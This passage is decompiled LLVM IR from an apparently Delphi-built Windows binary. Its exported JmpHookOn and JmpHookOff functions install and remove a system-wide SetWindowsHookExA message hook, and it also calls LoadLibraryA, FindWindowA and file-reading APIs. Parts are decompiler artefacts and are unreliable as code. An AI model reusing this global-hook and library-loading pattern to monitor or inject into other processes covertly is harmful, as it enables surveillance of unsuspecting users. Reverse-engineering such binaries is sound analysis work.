  store i32 ptrtoint ([7 x i8]* @global_var_4068cc to i32), i32* %132, align 4, !insn.addr !1513
  %133 = call i32 @function_404d80(), !insn.addr !1514
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1515
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1516
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1517
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1517
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1518
  %140 = call i32 @function_406350(), !insn.addr !1519
  %141 = call i32 @function_404ed8(), !insn.addr !1520
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1521
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1521
  br label %dec_label_pc_406831, !insn.addr !1521

dec_label_pc_4067d7:                              ; preds = %dec_label_pc_4065b7
  %142 = call i32 @function_4034c8(), !insn.addr !1522
  %143 = icmp slt i32 %142, 5, !insn.addr !1523
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1523
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1523
  br i1 %143, label %dec_label_pc_406831, label %dec_label_pc_4067e4, !insn.addr !1523

dec_label_pc_4067e4:                              ; preds = %dec_label_pc_4067d7
  %144 = add i32 %esp.0.reload, -40, !insn.addr !1524
  %145 = inttoptr i32 %144 to i32*, !insn.addr !1524
  store i32 ptrtoint ([5 x i8]* @global_var_4068bc to i32), i32* %145, align 4, !insn.addr !1524
  %146 = call i32 @function_404d80(), !insn.addr !1525
  %147 = add i32 %esp.0.reload, -44, !insn.addr !1526
  %148 = inttoptr i32 %147 to i32*, !insn.addr !1526
  %149 = add i32 %esp.0.reload, -48, !insn.addr !1527
  %150 = inttoptr i32 %149 to i32*, !insn.addr !1527
  store i32 ptrtoint ([7 x i8]* @global_var_4068cc to i32), i32* %150, align 4, !insn.addr !1527
  %151 = call i32 @function_404d80(), !insn.addr !1528
  %152 = add i32 %esp.0.reload, -52, !insn.addr !1529
  %153 = inttoptr i32 %152 to i32*
  %154 = call i32 @"@LStrCatN"(), !insn.addr !1530
  %155 = add i32 %esp.0.reload, -56, !insn.addr !1531
  %156 = inttoptr i32 %155 to i32*, !insn.addr !1531
  %157 = call i32 @function_406350(), !insn.addr !1532
  %158 = call i32 @function_404ed8(), !insn.addr !1533
  store i32* %153, i32** %.pre-phi.reg2mem, !insn.addr !1533
  store i32 %152, i32* %esp.1.reg2mem, !insn.addr !1533
  br label %dec_label_pc_406831, !insn.addr !1533

dec_label_pc_406831:                              ; preds = %dec_label_pc_4065b7, %dec_label_pc_4067e4, %dec_label_pc_4067d7, %dec_label_pc_40677a, %dec_label_pc_406769, %dec_label_pc_40663a, %dec_label_pc_406629
  %159 = add i32 %esp.0.reload, -16, !insn.addr !1534
  %160 = inttoptr i32 %159 to i32*, !insn.addr !1534
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %161 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1535
  call void @__writefsdword(i32 0, i32 %161), !insn.addr !1536
  %162 = add i32 %esp.1.reload, 8, !insn.addr !1537
  %163 = inttoptr i32 %162 to i32*, !insn.addr !1537
  store i32 4221011, i32* %163, align 4, !insn.addr !1537
  %164 = call i32 @"@LStrArrayClr"(), !insn.addr !1538
  ret i32 %164, !insn.addr !1539
}

define i32 @function_40684c() local_unnamed_addr {
dec_label_pc_40684c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1540
  ret i32 %0, !insn.addr !1540
}

define i32 @function_406851() local_unnamed_addr {
dec_label_pc_406851:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1541
}

define i32 @function_406853(i32 %arg1) local_unnamed_addr {
dec_label_pc_406853:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1542
}

define i32 @function_40687f() local_unnamed_addr {
dec_label_pc_40687f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1543
}

define i32 @function_406887() local_unnamed_addr {
dec_label_pc_406887:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1544
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1544
  store i32 %1, i32* %2, align 4, !insn.addr !1544
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1545
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1545
  %7 = add i8 %4, %6, !insn.addr !1545
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1545
  store i8 %7, i8* %8, align 1, !insn.addr !1545
  %9 = load i8, i8* %3, align 4, !insn.addr !1546
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1546
  %12 = trunc i32 %11 to i8, !insn.addr !1546
  %13 = add i8 %9, %12, !insn.addr !1546
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1546
  store i8 %13, i8* %14, align 1, !insn.addr !1546
  %15 = load i32, i32* %eax, align 4, !insn.addr !1547
  ret i32 %15, !insn.addr !1547
}

define i32 @function_40688e() local_unnamed_addr {
dec_label_pc_40688e:
  %0 = call i32 @function_4068cc(), !insn.addr !1548
  ret i32 %0, !insn.addr !1548
}

define i32 @function_4068ca() local_unnamed_addr {
dec_label_pc_4068ca:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1549
  %3 = inttoptr i32 %0 to i8*, !insn.addr !1549
  store i8 %2, i8* %3, align 1, !insn.addr !1549
  ret i32 %0, !insn.addr !1549
}

define i32 @function_4068cc() local_unnamed_addr {
dec_label_pc_4068cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i1 @__decompiler_undefined_function_4()
  %4 = call i1 @__decompiler_undefined_function_4()
  br i1 %3, label %dec_label_pc_406930, label %dec_label_pc_4068cf, !insn.addr !1550

dec_label_pc_4068cf:                              ; preds = %dec_label_pc_4068cc
  %5 = icmp eq i1 %4, false, !insn.addr !1551
  br i1 %5, label %dec_label_pc_406944, label %dec_label_pc_4068d1, !insn.addr !1551

dec_label_pc_4068d1:                              ; preds = %dec_label_pc_4068cf
  ret i32 %2, !insn.addr !1552

dec_label_pc_406930:                              ; preds = %dec_label_pc_4068cc
  %6 = call i32 @function_4045ac(), !insn.addr !1553
  br label %dec_label_pc_406944, !insn.addr !1554

dec_label_pc_406944:                              ; preds = %dec_label_pc_406930, %dec_label_pc_4068cf
  %7 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1555
  %8 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1556
  %9 = add i32 %0, 20, !insn.addr !1557
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1557
  %11 = load i32, i32* %10, align 4, !insn.addr !1557
  %12 = add i32 %0, 16, !insn.addr !1558
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1558
  %14 = load i32, i32* %13, align 4, !insn.addr !1558
  %15 = add i32 %0, 8, !insn.addr !1559
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1559
  %17 = load i32, i32* %16, align 4, !insn.addr !1559
  %18 = inttoptr i32 %11 to i32*, !insn.addr !1560
  %19 = call i32 @DefWindowProcA(i32* %18, i32 %14, i32 %1, i32 %17), !insn.addr !1560
  ret i32 %19, !insn.addr !1561
}

define i32 @function_40697c() local_unnamed_addr {
dec_label_pc_40697c:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1562
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1562
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4221184 to i32*), i32 -4, i32 %3), !insn.addr !1563
  ret i32 %4, !insn.addr !1564
}

define i32 @function_4069b1(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_4069b1:
  %merge.reg2mem = alloca i32, !insn.addr !1565
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1565
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1565
  store i8 %3, i8* %4, align 1, !insn.addr !1565
  %5 = add i32 %1, 114, !insn.addr !1566
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1566
  %7 = load i8, i8* %6, align 1, !insn.addr !1566
  %8 = udiv i32 %0, 256, !insn.addr !1566
  %9 = trunc i32 %8 to i8, !insn.addr !1566
  %10 = add i8 %7, %9, !insn.addr !1566
  store i8 %10, i8* %6, align 1, !insn.addr !1566
  %11 = add i8 %2, -32, !insn.addr !1567
  %12 = icmp ult i8 %2, 32, !insn.addr !1567
  %13 = icmp eq i8 %11, 0, !insn.addr !1567
  %14 = zext i8 %11 to i32, !insn.addr !1567
  %15 = and i32 %1, -256, !insn.addr !1567
  %16 = or i32 %15, %14, !insn.addr !1567
  %17 = or i1 %12, %13, !insn.addr !1568
  store i32 %16, i32* %merge.reg2mem, !insn.addr !1568
  br i1 %17, label %dec_label_pc_4069ba, label %dec_label_pc_406a29, !insn.addr !1568

dec_label_pc_4069ba:                              ; preds = %dec_label_pc_4069b1
  %18 = add i32 %16, 105, !insn.addr !1569
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1569
  %20 = load i8, i8* %19, align 1, !insn.addr !1569
  %21 = and i8 %20, %9, !insn.addr !1569
  store i8 %21, i8* %19, align 1, !insn.addr !1569
  %22 = trunc i32 %arg3 to i16, !insn.addr !1570
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1570
  %24 = load i8, i8* %23, align 1, !insn.addr !1570
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1570
  %25 = add i32 %arg5, 105, !insn.addr !1571
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1571
  %28 = load i8, i8* %27, align 1, !insn.addr !1571
  %29 = udiv i32 %arg2, 256, !insn.addr !1571
  %30 = trunc i32 %29 to i8, !insn.addr !1571
  %31 = and i8 %28, %30, !insn.addr !1571
  store i8 %31, i8* %27, align 1, !insn.addr !1571
  %32 = mul i32 %arg5, 2, !insn.addr !1572
  %33 = add i32 %arg2, 115, !insn.addr !1572
  %34 = add i32 %33, %32, !insn.addr !1572
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1572
  %36 = load i8, i8* %35, align 1, !insn.addr !1572
  %37 = trunc i32 %arg2 to i8, !insn.addr !1572
  %38 = add i8 %36, %37, !insn.addr !1572
  %39 = icmp eq i8 %38, 0, !insn.addr !1572
  store i8 %38, i8* %35, align 1, !insn.addr !1572
  br i1 %39, label %dec_label_pc_406a0b, label %dec_label_pc_4069c9, !insn.addr !1573

dec_label_pc_4069c9:                              ; preds = %dec_label_pc_4069ba
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1574
  %41 = load i32, i32* %40, align 4, !insn.addr !1574
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1574
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1575
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1575
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1575
  %45 = icmp eq i32* %43, null, !insn.addr !1576
  %46 = icmp eq i1 %45, false, !insn.addr !1577
  store i32 %44, i32* %merge.reg2mem, !insn.addr !1577
  br i1 %46, label %dec_label_pc_406a29, label %dec_label_pc_4069ed, !insn.addr !1577

dec_label_pc_4069ed:                              ; preds = %dec_label_pc_4069c9
  %47 = call i32 @function_40697c(), !insn.addr !1578
  %48 = call i32 @function_4036c8(), !insn.addr !1579
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1580
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1581
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1581
  ret i32 %51, !insn.addr !1582

dec_label_pc_406a0b:                              ; preds = %dec_label_pc_4069ba
  %52 = add i32 %29, %arg1, !insn.addr !1583
  %53 = and i32 %52, 255, !insn.addr !1583
  %54 = and i32 %arg1, -256, !insn.addr !1583
  %55 = or i32 %53, %54, !insn.addr !1583
  ret i32 %55, !insn.addr !1584

dec_label_pc_406a29:                              ; preds = %dec_label_pc_4069c9, %dec_label_pc_4069b1
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !1585
}

define i32 @function_406ad1(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10) local_unnamed_addr {
dec_label_pc_406ad1:
  %eax.0.reg2mem = alloca i32, !insn.addr !1586
  %.reg2mem1 = alloca i32, !insn.addr !1586
  %.reg2mem = alloca i32, !insn.addr !1586
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1586
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1586
  store i8 %3, i8* %4, align 1, !insn.addr !1586
  %5 = add i32 %1, 114, !insn.addr !1587
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1587
  %7 = load i8, i8* %6, align 1, !insn.addr !1587
  %8 = udiv i32 %0, 256, !insn.addr !1587
  %9 = trunc i32 %8 to i8, !insn.addr !1587
  %10 = add i8 %7, %9, !insn.addr !1587
  store i8 %10, i8* %6, align 1, !insn.addr !1587
  %11 = add i8 %2, -32, !insn.addr !1588
  %12 = icmp ult i8 %2, 32, !insn.addr !1588
  %13 = icmp eq i8 %11, 0, !insn.addr !1588
  %14 = zext i8 %11 to i32, !insn.addr !1588
  %15 = and i32 %1, -256, !insn.addr !1588
  %16 = or i32 %15, %14, !insn.addr !1588
  %17 = or i1 %12, %13, !insn.addr !1589
  store i32 %16, i32* %.reg2mem, !insn.addr !1589
  br i1 %17, label %dec_label_pc_406ada, label %18, !insn.addr !1589

; <label>:18:                                     ; preds = %dec_label_pc_406ad1
  %19 = call i32 @function_406b49(), !insn.addr !1589
  store i32 %19, i32* %.reg2mem, !insn.addr !1589
  br label %dec_label_pc_406ada, !insn.addr !1589

dec_label_pc_406ada:                              ; preds = %dec_label_pc_406ad1, %18
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1590
  %20 = add i32 %.reload, 105, !insn.addr !1590
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1590
  %22 = load i8, i8* %21, align 1, !insn.addr !1590
  %23 = and i8 %22, %9, !insn.addr !1590
  store i8 %23, i8* %21, align 1, !insn.addr !1590
  %24 = trunc i32 %arg6 to i16, !insn.addr !1591
  %25 = inttoptr i32 %arg9 to i8*, !insn.addr !1591
  %26 = load i8, i8* %25, align 1, !insn.addr !1591
  call void @__asm_outsb(i16 %24, i8 %26), !insn.addr !1591
  %27 = add i32 %arg8, 105, !insn.addr !1592
  %28 = and i32 %27, 65535
  %29 = inttoptr i32 %28 to i8*, !insn.addr !1592
  %30 = load i8, i8* %29, align 1, !insn.addr !1592
  %31 = udiv i32 %arg5, 256, !insn.addr !1592
  %32 = trunc i32 %31 to i8, !insn.addr !1592
  %33 = and i8 %30, %32, !insn.addr !1592
  store i8 %33, i8* %29, align 1, !insn.addr !1592
  %34 = mul i32 %arg8, 2, !insn.addr !1593
  %35 = add i32 %arg5, 115, !insn.addr !1593
  %36 = add i32 %35, %34, !insn.addr !1593
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1593
  %38 = load i8, i8* %37, align 1, !insn.addr !1593
  %39 = trunc i32 %arg5 to i8, !insn.addr !1593
  %40 = add i8 %38, %39, !insn.addr !1593
  %41 = icmp slt i8 %40, 0, !insn.addr !1593
  store i8 %40, i8* %37, align 1, !insn.addr !1593
  %42 = inttoptr i32 %arg9 to i32*, !insn.addr !1594
  %43 = load i32, i32* %42, align 4, !insn.addr !1594
  call void @__asm_outsd(i16 %24, i32 %43), !insn.addr !1594
  store i32 %arg4, i32* %.reg2mem1, !insn.addr !1595
  br i1 %41, label %44, label %dec_label_pc_406aee, !insn.addr !1595

; <label>:44:                                     ; preds = %dec_label_pc_406ada
  %45 = call i32 @function_406b60(), !insn.addr !1595
  store i32 %45, i32* %.reg2mem1, !insn.addr !1595
  br label %dec_label_pc_406aee, !insn.addr !1595

dec_label_pc_406aee:                              ; preds = %dec_label_pc_406ada, %44
  %.reload2 = load i32, i32* %.reg2mem1
  %46 = trunc i32 %.reload2 to i8, !insn.addr !1596
  %47 = add i8 %46, -32, !insn.addr !1596
  %48 = icmp ult i8 %46, 32, !insn.addr !1596
  %49 = icmp eq i8 %47, 0, !insn.addr !1596
  %50 = zext i8 %47 to i32, !insn.addr !1596
  %51 = and i32 %.reload2, -256, !insn.addr !1596
  %52 = or i32 %51, %50, !insn.addr !1596
  %53 = or i1 %48, %49, !insn.addr !1597
  store i32 %52, i32* %eax.0.reg2mem, !insn.addr !1597
  br i1 %53, label %dec_label_pc_406af2, label %54, !insn.addr !1597

; <label>:54:                                     ; preds = %dec_label_pc_406aee
  %55 = call i32 @function_406b61(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1597
  store i32 %55, i32* %eax.0.reg2mem, !insn.addr !1597
  br label %dec_label_pc_406af2, !insn.addr !1597

dec_label_pc_406af2:                              ; preds = %dec_label_pc_406aee, %54
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %56 = add i32 %arg5, 105, !insn.addr !1598
  %57 = inttoptr i32 %56 to i8*, !insn.addr !1598
  %58 = load i8, i8* %57, align 1, !insn.addr !1598
  %59 = udiv i32 %eax.0.reload, 256, !insn.addr !1598
  %60 = trunc i32 %59 to i8, !insn.addr !1598
  %61 = and i8 %58, %60, !insn.addr !1598
  store i8 %61, i8* %57, align 1, !insn.addr !1598
  %62 = add i32 %arg9, 105, !insn.addr !1599
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1599
  %64 = load i8, i8* %63, align 1, !insn.addr !1599
  %65 = and i8 %64, %32, !insn.addr !1599
  store i8 %65, i8* %63, align 1, !insn.addr !1599
  %66 = inttoptr i32 %eax.0.reload to i8*, !insn.addr !1600
  %67 = load i8, i8* %66, align 1, !insn.addr !1600
  %68 = trunc i32 %eax.0.reload to i8, !insn.addr !1600
  %factor = mul i8 %68, 2
  %69 = add i8 %67, %factor, !insn.addr !1601
  store i8 %69, i8* %66, align 1, !insn.addr !1601
  %70 = inttoptr i32 %arg5 to i32*, !insn.addr !1602
  %71 = load i32, i32* %70, align 4, !insn.addr !1602
  %72 = add i32 %71, %arg9, !insn.addr !1602
  store i32 %72, i32* %70, align 4, !insn.addr !1602
  %73 = load i8, i8* %66, align 1, !insn.addr !1603
  %74 = add i8 %73, %68, !insn.addr !1603
  store i8 %74, i8* %66, align 1, !insn.addr !1603
  %75 = inttoptr i32 %arg8 to i32*, !insn.addr !1604
  %76 = call i32 @CallNextHookEx(i32* %75, i32 %arg1, i32 %arg2, i32 %arg3), !insn.addr !1604
  ret i32 %76, !insn.addr !1605
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_406b20:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4221696 to i32*), i32 3), !insn.addr !1606
  %2 = ptrtoint i32* %1 to i32, !insn.addr !1606
  store i32 %2, i32* @global_var_4096e0, align 4, !insn.addr !1607
  %3 = icmp eq i32* %1, null, !insn.addr !1608
  %4 = icmp eq i1 %3, false, !insn.addr !1609
  %5 = sext i1 %4 to i32, !insn.addr !1610
  ret i32 %5, !insn.addr !1611
}

define i32 @function_406b49() local_unnamed_addr {
dec_label_pc_406b49:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1612
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_406b4c:
  %0 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1613
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1614
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !1614
  %3 = sext i1 %2 to i32, !insn.addr !1614
  ret i32 %3, !insn.addr !1615
}

define i32 @function_406b60() local_unnamed_addr {
dec_label_pc_406b60:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_406b61(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406b61:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = add i32 %2, 1, !insn.addr !1616
  %4 = mul i32 %0, 8, !insn.addr !1617
  %5 = add i32 %0, 48, !insn.addr !1617
  %6 = add i32 %5, %4, !insn.addr !1617
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1617
  %8 = load i8, i8* %7, align 1, !insn.addr !1617
  %9 = udiv i32 %3, 256, !insn.addr !1617
  %10 = trunc i32 %9 to i8, !insn.addr !1617
  %11 = add i8 %8, %10, !insn.addr !1617
  store i8 %11, i8* %7, align 1, !insn.addr !1617
  call void @__writefsdword(i32 %3, i32 %1), !insn.addr !1618
  %12 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1619
  %13 = add i32 %12, 1, !insn.addr !1619
  %14 = icmp eq i32 %13, 0, !insn.addr !1619
  store i32 %13, i32* @global_var_4096dc, align 4, !insn.addr !1619
  %15 = icmp eq i1 %14, false, !insn.addr !1620
  br i1 %15, label %dec_label_pc_406b7b, label %dec_label_pc_406b71, !insn.addr !1620

dec_label_pc_406b71:                              ; preds = %dec_label_pc_406b61
  %16 = call i32 @"@LStrClr"(), !insn.addr !1621
  br label %dec_label_pc_406b7b, !insn.addr !1621

dec_label_pc_406b7b:                              ; preds = %dec_label_pc_406b71, %dec_label_pc_406b61
  call void @__writefsdword(i32 0, i32 %arg3), !insn.addr !1622
  ret i32 0, !insn.addr !1623
}

define i32 @function_406b89() local_unnamed_addr {
dec_label_pc_406b89:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1624
  ret i32 %0, !insn.addr !1624
}

define i32 @function_406b8e() local_unnamed_addr {
dec_label_pc_406b8e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1625
}

define i32 @function_406b90(i32 %arg1) local_unnamed_addr {
dec_label_pc_406b90:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1626
}

define i32 @function_406b94() local_unnamed_addr {
dec_label_pc_406b94:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1627
  %2 = add i32 %1, -1, !insn.addr !1627
  store i32 %2, i32* @global_var_4096dc, align 4, !insn.addr !1627
  ret i32 %0, !insn.addr !1628
}

define i32 @function_406be4() local_unnamed_addr {
dec_label_pc_406be4:
  %esp.1.reg2mem = alloca i32, !insn.addr !1629
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1630
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1630
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1630
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1631
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1632
  %3 = call i32 @function_4036c8(), !insn.addr !1633
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1634
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1634
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1634
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1635
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1636
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1637
  br i1 %7, label %dec_label_pc_406d83, label %dec_label_pc_406c4e, !insn.addr !1637

dec_label_pc_406c4e:                              ; preds = %dec_label_pc_406be4
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1635
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1638
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1638
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1639
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1640
  br i1 %12, label %dec_label_pc_406d83, label %dec_label_pc_406c6a, !insn.addr !1640

dec_label_pc_406c6a:                              ; preds = %dec_label_pc_406c4e
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1641
  %14 = call i32 @function_403720(), !insn.addr !1642
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1643
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1643
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1644
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1644
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1645
  %19 = call i32 @function_4046d4(), !insn.addr !1646
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_406d83

dec_label_pc_406d83:                              ; preds = %dec_label_pc_406c6a, %dec_label_pc_406c4e, %dec_label_pc_406be4
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1647
  %21 = load i32, i32* %20, align 4, !insn.addr !1647
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1648
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1649
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1649
  store i32 4222373, i32* %23, align 4, !insn.addr !1649
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1650
  ret i32 %24, !insn.addr !1651
}

define i32 @function_406d9e() local_unnamed_addr {
dec_label_pc_406d9e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1652
  ret i32 %0, !insn.addr !1652
}

define i32 @function_406da3() local_unnamed_addr {
dec_label_pc_406da3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1653
}

define i32 @function_406da5(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406da5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1654
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1654
  %3 = load i32, i32* %2, align 4, !insn.addr !1654
  ret i32 %3, !insn.addr !1655
}

define i32 @function_406ddc() local_unnamed_addr {
dec_label_pc_406ddc:
  %esp.2.reg2mem = alloca i32, !insn.addr !1656
  %esp.1.reg2mem = alloca i32, !insn.addr !1656
  %esi.0.reg2mem = alloca i32, !insn.addr !1656
  %esp.0.reg2mem = alloca i32, !insn.addr !1656
  %ebx.0.reg2mem = alloca i32, !insn.addr !1656
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1657
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1658
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1658
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1658
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1659
  %2 = call i32 @function_403c88(), !insn.addr !1660
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1661
  br i1 %3, label %dec_label_pc_406ec5, label %dec_label_pc_406e0a, !insn.addr !1661

dec_label_pc_406e0a:                              ; preds = %dec_label_pc_406ddc
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1662
  %5 = call i32 @function_4036c8(), !insn.addr !1663
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1664
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1664
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1664
